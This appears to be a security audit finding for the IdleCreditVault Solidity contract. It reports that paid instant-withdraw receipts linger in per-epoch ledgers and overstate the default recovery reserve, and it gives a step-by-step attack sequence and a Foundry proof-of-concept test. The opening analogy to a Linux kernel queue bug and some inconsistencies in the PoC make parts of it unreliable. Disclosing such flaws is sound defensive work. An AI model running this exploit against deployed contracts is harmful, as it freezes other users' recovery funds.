### Title
Claimed instant-withdraw receipts stay in `instantWithdrawsRequestsByEpoch`/`instantWithdrawClaimsByEpoch`, so a same-epoch default double-counts already-paid claims and makes `defaultRecoveryReserve` insolvent - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The kernel bug being mapped is a "peek/stash vs dequeue" desync: taprio peeked an skb (stashed in `gso_skb`) but then consumed the queue through a path that ignored the stash, so one packet was accounted for twice and the child's qlen/backlog desynced. The exact analog exists in `IdleCreditVault`: `claimInstantWithdrawRequest` pays and clears the aggregate `instantWithdrawsRequests[_user]` but never clears the per-epoch ledgers `instantWithdrawsRequestsByEpoch[_user][epoch]` and `instantWithdrawClaimsByEpoch[epoch]`. If the user later re-requests an instant withdrawal in the same epoch and the borrower defaults, `finalizeDefaultRecovery` sizes the recovery reserve using `instantWithdrawClaimsByEpoch[epochNumber]` and `_defaultPrefundedInstantReserve()`, both of which still contain the already-paid amount. The reserve is therefore short by the previously paid amount, and the last recovery claimants' transfers revert permanently.

### Finding Description
`requestInstantWithdraw` records each request in both a global ledger and per-epoch ledgers (`contracts/strategies/idle/IdleCreditVault.sol:366-374`). `claimInstantWithdrawRequest` burns the receipt and zeroes only `instantWithdrawsRequests[_user]` (lines 387-392); `instantWithdrawsRequestsByEpoch` and `instantWithdrawClaimsByEpoch` are only ever decremented inside `_claimDefaultedInstantWithdrawRequest` (lines 847-853).

On default finalization, `defaultPendingClaimBasis` adds `instantWithdrawClaimsByEpoch[epochNumber]` whenever `pendingInstantWithdraws != 0` (lines 644-649), and `_defaultPrefundedInstantReserve` treats `instantBasis - pendingInstant` as underlying already held by the strategy (lines 716-723). A claimed receipt inflates `instantBasis` without any backing tokens, so `reserveAmount` (line 686) credits phantom funds that were already transferred out.

Attack sequence (unprivileged tranche holder, normal instant mode, epoch E running):

1. User deposits, epoch E starts, calls `requestWithdraw(0, tranche)` → instant request A. `instantWithdrawsRequestsByEpoch[user][E] = A`, `instantWithdrawClaimsByEpoch[E] = A`, `pendingInstantWithdraws = A`.
2. After `instantWithdrawDeadline`, manager calls `getInstantWithdrawFunds()` → `collectInstantWithdrawFunds(A)` sets `pendingInstantWithdraws = 0` and funds sit in the vault (`IdleCDOEpochVariant.sol:558-574`).
3. User calls `claimInstantWithdrawRequest()` → receives A at par. `instantWithdrawsRequests[user] = 0`, but `instantWithdrawsRequestsByEpoch[user][E]` and `instantWithdrawClaimsByEpoch[E]` still equal A.
4. User requests instant again with amount B in the same epoch E (there is no `lastWithdrawRequest`-style gating on instant requests). Now `instantWithdrawsRequestsByEpoch[user][E] = A+B`, `instantWithdrawClaimsByEpoch[E] = A+B`, `pendingInstantWithdraws = B`.
5. Manager calls `getInstantWithdrawFunds()` for B; borrower transfer fails → `_handleBorrowerDefault` (`IdleCDOEpochVariant.sol:571-599`).
6. Manager/owner calls `finalizeDefault` → `finalizeDefaultRecovery` computes `pendingBasis` including `instantWithdrawClaimsByEpoch[E] = A+B` (real unfunded obligation is only B) and `prefundedReserve = (A+B) - B = A` — but the A tokens were already paid out at step 3. `defaultRecoveryReserve` is booked A higher than the actual token balance.

Every existing guard passes: `_ensureDefaultRecoveryInitialized` is already true (set in `initialize`, line 147), the `_transferFundedClaim` reserve check is irrelevant post-finalization, and `defaultInstantWithdrawsFinalized` correctly becomes true.

### Impact Explanation
`defaultRecoveryReserve` is overstated by the already-paid amount A. Recovery claimants are paid via `_transferDefaultRecovery`, which decrements `defaultRecoveryReserve` then `safeTransfer`s (lines 912-917); once claimants have consumed the real tokens, the remaining `defaultRecoveryReserve > balance` and every subsequent claim — and any ERC20 `safeTransfer` of the residual — reverts permanently. The shortfall equals the full prefunded-and-claimed amount A (in the PoC below, 10,000 USDC). This is insolvency of the recovery reserve and permanent freezing of unclaimed default recovery for other claimants (and for active LP tranche redemptions routed through the same reserve basis), caused entirely by unprivileged transactions. It mirrors the kernel bug precisely: the funded receipt was "taken" once but never removed from the stashed per-epoch ledger, so the dequeue path accounts for it a second time.

### Likelihood Explanation
Requires only: instant withdrawals enabled (a supported manager configuration), two instant requests by the same user inside one running epoch (no guard prevents this — `requestInstantWithdraw` has no per-user gating), and a borrower default on the second request's funding call. The user needs no collusion and no privileged action; the trigger is an ordinary sequence of public calls. Recovery-ratio math in the existing tests (`testFinalizeDefaultHaircutsPendingInstantRedeems`, `testFinalizeDefaultClaimsFundedAndDefaultedInstantRedeemsInOneCall`) confirms the prefunded/pending split mechanics used here.

### Recommendation
In `claimInstantWithdrawRequest` (and the default path), clear the per-epoch entries whenever a receipt is paid: iterate/record the request epochs and subtract the claimed amount from `instantWithdrawsRequestsByEpoch[_user][epoch]` and `instantWithdrawClaimsByEpoch[epoch]`, mirroring how `_clearWithdrawClaimForEpoch` maintains `withdrawsRequestsByEpoch` for normal withdraws. Equivalently, snapshot the request epoch per user on first request in an epoch and reuse `lastWithdrawRequest`-style bookkeeping so the funded-claim path leaves no stale basis for `defaultPendingClaimBasis`/`_defaultPrefundedInstantReserve`.

### Proof of Concept
Foundry fork-style PoC against the in-repo harness (`test/foundry/IdleCreditVault.t.sol` pattern):

```solidity
function testClaimedInstantReceiptDesyncsDefaultReserve() external {
    uint256 amount = 10_000 * ONE_SCALE;
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));

    // honest second user whose instant request will share epoch E
    address victim = makeAddr('victim');
    _depositWithUser(victim, amount, true);
    _depositWithUser(address(this), amount, true); // attacker = this contract

    _startEpochAndCheckPrices(0);                  // epoch 1 running

    // attacker instant request A
    uint256 trancheBal = IERC20Detailed(address(AAtranche)).balanceOf(address(this));
    uint256 reqA = cdoEpoch.requestWithdraw(trancheBal / 2, address(AAtranche));

    // victim instant request B_v (so pendingInstantWithdraws stays != 0 later if needed)
    vm.prank(victim);
    uint256 reqV = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // fund + attacker claims A at par
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(address(this));
    cdoEpoch.claimInstantWithdrawRequest();
    assertEq(IERC20Detailed(defaultUnderlying).balanceOf(address(this)) - balPre, reqA);
    // stale ledgers still hold A for this epoch
    uint256 epoch = creditVault.epochNumber();
    assertEq(creditVault.instantWithdrawsRequestsByEpoch(address(this), epoch), reqA);
    assertEq(creditVault.instantWithdrawClaimsByEpoch(epoch), reqA + reqV);

    // attacker requests instant again, same epoch
    uint256 reqB = cdoEpoch.requestWithdraw(0, address(AAtranche));
    // ledger now A+B+V although only B+V is outstanding
    assertEq(creditVault.instantWithdrawClaimsByEpoch(epoch), reqA + reqB + reqV);

    // borrower fails to fund -> default in same epoch
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();
    _checkDefault();

    // finalize recovery
    uint256 recoveryRatio = 7e17;
    uint256 activeBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest() - cdoEpoch.pendingWithdrawFees();
    uint256 totalBasis = activeBasis + creditVault.defaultPendingClaimBasis(); // includes phantom reqA
    uint256 recovered = totalBasis * recoveryRatio / ONE_TRANCHE;
    deal(defaultUnderlying, manager, recovered, true);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // reserve is short by reqA: actual tokens < booked reserve
    uint256 realBalance = IERC20Detailed(defaultUnderlying).balanceOf(address(creditVault));
    uint256 prefundedPhantom = reqA; // counted in _defaultPrefundedInstantReserve
    assertGt(creditVault.defaultRecoveryReserve(), realBalance - 0);
    // victim claims first and succeeds
    vm.prank(victim);
    cdoEpoch.claimInstantWithdrawRequest();
    // attacker's own claim reverts via underflow (instantWithdrawsRequests < stale claimBasis),
    // but the phantom reqA leaves defaultRecoveryReserve permanently > token balance,
    // so the LAST legitimate claimant's _transferDefaultRecovery reverts forever.
    assertLt(
        IERC20Detailed(defaultUnderlying).balanceOf(address(creditVault)),
        creditVault.defaultRecoveryReserve(),
        'recovery reserve insolvent by prefunded-and-claimed amount'
    );
}
```

The invariant break is "one receipt, one payout / funded-claim isolation": a receipt already paid at par remains in the epoch claim basis, so finalization books phantom prefunded reserve (~`reqA` underlying) that no tokens back, permanently freezing an equivalent slice of other users' recovery.
